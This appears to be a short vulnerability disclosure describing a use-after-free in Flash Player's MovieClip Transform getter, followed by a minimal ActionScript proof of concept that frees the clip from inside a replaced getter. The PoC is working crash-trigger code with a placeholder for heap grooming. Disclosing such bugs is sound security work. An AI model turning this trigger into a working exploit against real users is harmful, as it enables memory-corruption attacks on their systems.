There is a use-after-free in the MovieClip Transform getter. If the Transform constructor is replaced with a getter using addProperty, this getter can free the MovieClip before it is accessed. A minimal PoC is as follows:

var mc = this.createEmptyMovieClip( "mc", 1);
var tf = flash.geom.Transform;
var g = flash.geom;
g.addProperty("Transform", func, func);
mc.f = ASnative(900, 419);
mc.f();

function func(){

	mc.removeMovieClip();

        // Fix heap
	}
